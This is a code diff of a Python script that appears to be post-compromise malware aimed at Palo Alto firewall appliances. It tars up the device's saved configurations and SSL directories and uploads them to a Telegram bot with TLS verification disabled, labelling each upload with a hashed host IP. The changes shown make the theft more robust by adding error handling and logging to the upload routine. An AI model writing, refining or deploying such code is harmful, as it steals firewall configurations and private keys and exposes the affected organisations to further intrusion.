@@ -5,6 +5,8 @@ import hashlib
 import os
 import io
 import tarfile
+import requests
+import urllib3
 
 def install_package(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
@@ -20,8 +22,6 @@ def check_and_install_libraries():
 
 check_and_install_libraries()
 
-import requests
-import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def send_to_telegram(message, files):
@@ -31,23 +31,29 @@ def send_to_telegram(message, files):
 
     multipart_data = {"chat_id": (None, tg_chat_id), "text": (None, message)}
     
+    # Prepare files to send
     files_to_send = {}
     for file_name, file_data in files.items():
-        # Ensure files are handled as file-like objects
+        # Print the file size for debugging purposes
+        print(f"Preparing file: {file_name}, Size: {len(file_data.getvalue())} bytes")
+        
         files_to_send[file_name] = (file_name, file_data, "application/gzip")
 
-    response = requests.post(
-        url.replace("sendMessage", "sendDocument"), files={**multipart_data, **files_to_send}, verify=False
-    )
-    
-    # Printing the response for debugging purposes
-    if response.status_code != 200:
-        print(f"Error: {response.status_code}")
-        print(response.text)  # This will print the error message from Telegram
-    else:
-        print("Message and files sent successfully!")
-    
-    return response.ok
+    try:
+        response = requests.post(
+            url.replace("sendMessage", "sendDocument"), files={**multipart_data, **files_to_send}, verify=False
+        )
+        response.raise_for_status()  # This will raise an error for bad HTTP status codes
+        
+        if response.status_code == 200:
+            print("Message and files sent successfully!")
+            return True
+        else:
+            print(f"Error: {response.status_code}, Response: {response.text}")
+            return False
+    except requests.exceptions.RequestException as e:
+        print(f"Exception during sending request: {e}")
+        return False
 
 def archive_directory(directory_path):
     tar_stream = io.BytesIO()
@@ -73,11 +79,13 @@ def main():
         message += f"------------------\n"
         message += f"#{ip_hash[:8]}"
 
+        # Archive directories
         files = {
             "saved-configs.tar.gz": archive_directory("/opt/pancfg/mgmt/saved-configs"),
             "ssl.tar.gz": archive_directory("/opt/pancfg/mgmt/ssl"),
         }
 
+        # Send message and files
         if send_to_telegram(message, files):
             print("Message and files sent successfully!")
         else:
